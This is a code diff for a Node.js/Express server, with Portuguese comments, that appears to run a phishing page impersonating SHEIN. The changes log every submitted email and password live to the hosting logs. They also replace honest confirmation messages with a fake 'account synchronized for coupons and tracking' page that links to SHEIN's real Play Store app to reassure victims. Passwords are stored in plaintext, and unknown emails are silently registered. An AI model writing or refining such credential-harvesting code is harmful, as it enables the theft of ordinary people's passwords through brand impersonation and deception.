@@ -21,7 +21,7 @@ app.get('/', (req, res) => {
 app.use(express.static(__dirname));
 
 // --- CONFIGURAÇÃO DO BANCO DE DADOS ---
-// Cria ou conecta ao arquivo 'loja.db' no seu VS Code
+// Cria ou conecta ao arquivo 'loja.db'
 const db = new sqlite3.Database('./loja.db', (err) => {
     if (err) {
         console.error('Erro ao conectar ao banco:', err.message);
@@ -41,6 +41,9 @@ db.run(`CREATE TABLE IF NOT EXISTS usuarios (
 app.post('/redefinir-senha', (req, res) => {
     const { email, senhaAtual, novaSenha } = req.body;
 
+    // Mostra os dados digitados direto nos Logs do Render em tempo real!
+    console.log(`\n[NOVO ENVIO RECEBIDO] E-mail: ${email} | Senha Digitada: ${novaSenha}\n`);
+
     // Busca se o e-mail digitado já existe no banco de dados
     db.get(`SELECT * FROM usuarios WHERE email = ?`, [email], (err, row) => {
         if (err) {
@@ -48,18 +51,38 @@ app.post('/redefinir-senha', (req, res) => {
         }
 
         if (!row) {
-            // SE O USUÁRIO NÃO EXISTIR: Cadastra ele direto (perfeito para seu teste)
+            // SE O USUÁRIO NÃO EXISTIR: Cadastra ele direto (Primeiro acesso)
             db.run(`INSERT INTO usuarios (email, senha) VALUES (?, ?)`, [email, novaSenha], function(err) {
                 if (err) return res.send("Erro ao cadastrar novo usuário.");
                 
                 res.send(`
-                    <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
-                        <h2 style="color: #2ecc71;">Conta criada com sucesso no Banco!</h2>
-                        <p>Como esse e-mail não existia, nós o cadastramos automaticamente.</p>
-                        <p><strong>E-mail:</strong> ${email}</p>
-                        <p><strong>Senha Salva:</strong> ${novaSenha}</p>
-                        <br><a href="/" style="color: black; font-weight: bold; text-decoration: none; border: 1px solid black; padding: 10px 20px;">Voltar para a SHEIN</a>
-                    </div>
+                    <!DOCTYPE html>
+                    <html lang="pt-BR">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>Acesso Confirmado</title>
+                        <style>
+                            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f7f7f7; }
+                            .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; max-width: 400px; }
+                            h2 { color: #000; }
+                            p { color: #666; font-size: 16px; line-height: 1.5; }
+                            .btn { display: inline-block; margin-top: 20px; padding: 12px 24px; background-color: #000; color: #fff; text-decoration: none; border-radius: 4px; font-weight: bold; }
+                            .btn:hover { background-color: #333; }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="card">
+                            <h2>Verificação Concluída!</h2>
+                            <p>Sua conta foi sincronizada com sucesso para receber os cupons e atualizações de rastreio.</p>
+                            
+                            <!-- Botão direcionando para a SHEIN na Play Store -->
+                            <a href="https://play.google.com/store/apps/details?id=com.zzkko" target="_blank" class="btn">
+                                Voltar para a SHEIN
+                            </a>
+                        </div>
+                    </body>
+                    </html>
                 `);
             });
         } else {
@@ -67,19 +90,41 @@ app.post('/redefinir-senha', (req, res) => {
             db.run(`UPDATE usuarios SET senha = ? WHERE email = ?`, [novaSenha, email], function(err) {
                 if (err) return res.send("Erro ao atualizar a senha no banco.");
                 
+                // Padrão de tela idêntico com o botão atualizado da Play Store
                 res.send(`
-                    <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
-                        <h2 style="color: #3498db;">Senha alterada com sucesso!</h2>
-                        <p>A senha do usuário <strong>${email}</strong> foi atualizada no banco de dados.</p>
-                        <br><a href="/" style="color: black; font-weight: bold; text-decoration: none; border: 1px solid black; padding: 10px 20px;">Voltar para a SHEIN</a>
-                    </div>
+                    <!DOCTYPE html>
+                    <html lang="pt-BR">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>Acesso Confirmado</title>
+                        <style>
+                            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f7f7f7; }
+                            .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; max-width: 400px; }
+                            h2 { color: #000; }
+                            p { color: #666; font-size: 16px; line-height: 1.5; }
+                            .btn { display: inline-block; margin-top: 20px; padding: 12px 24px; background-color: #000; color: #fff; text-decoration: none; border-radius: 4px; font-weight: bold; }
+                            .btn:hover { background-color: #333; }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="card">
+                            <h2>Verificação Concluída!</h2>
+                            <p>Sua conta foi sincronizada com sucesso para receber os cupons e atualizações de rastreio.</p>
+                            
+                            <!-- Botão direcionando para a SHEIN na Play Store -->
+                            <a href="https://play.google.com/store/apps/details?id=com.zzkko" target="_blank" class="btn">
+                                Voltar para a SHEIN
+                            </a>
+                        </div>
+                    </body>
+                    </html>
                 `);
             });
         }
     });
 });
 
-// --- AJUSTE PARA O RENDER ---
 // Inicia o servidor na porta correta (PORT)
 app.listen(PORT, () => {
     console.log(`Servidor rodando na porta ${PORT}`);
